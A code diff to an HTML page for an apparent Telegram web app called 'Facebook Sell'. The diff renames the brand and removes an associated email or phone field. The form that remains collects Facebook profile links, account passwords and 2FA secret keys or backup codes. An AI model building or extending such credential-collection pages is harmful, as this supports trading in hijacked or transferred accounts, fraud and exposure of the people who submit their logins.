@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Facebook Sell - Easy IncomeX</title>
+  <title>Facebook Sell - NexoraX</title>
   
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -369,11 +369,6 @@
         </div>
 
         <div class="form-group">
-          <label class="form-label" for="associatedLogin">Associated Phone / Email</label>
-          <input type="text" id="associatedLogin" class="form-input" placeholder="e.g. login email or phone number" required>
-        </div>
-
-        <div class="form-group">
           <label class="form-label" for="twoFactorAuth">Two-factor authentication (2FA Code / Key)</label>
           <input type="text" id="twoFactorAuth" class="form-input" placeholder="Enter 2FA backup codes or 2FA secret key" required>
         </div>
@@ -555,7 +550,7 @@
         div.innerHTML = `
           <div>
             <div class="history-title">${item.profileLink || "Facebook Account"}</div>
-            <div class="history-meta">${item.loginIdentifier || ""} • ${dateStr}</div>
+            <div class="history-meta">${item.loginIdentifier ? item.loginIdentifier + ' • ' : ''}${dateStr}</div>
           </div>
           <span class="pill-badge pill-${item.status}">${item.status}</span>
         `;
@@ -567,7 +562,6 @@
       e.preventDefault();
 
       const profileLink = document.getElementById("fbProfileLink").value.trim();
-      const loginIdentifier = document.getElementById("associatedLogin").value.trim();
       const twoFactorAuth = document.getElementById("twoFactorAuth").value.trim();
       const accountPassword = document.getElementById("accountPassword").value.trim();
       const notes = document.getElementById("submissionDetails").value.trim();
@@ -581,7 +575,6 @@
           userId: currentUserId,
           serviceType: "facebook",
           profileLink: profileLink,
-          loginIdentifier: loginIdentifier,
           twoFactorAuth: twoFactorAuth,
           password: accountPassword,
           notes: notes,
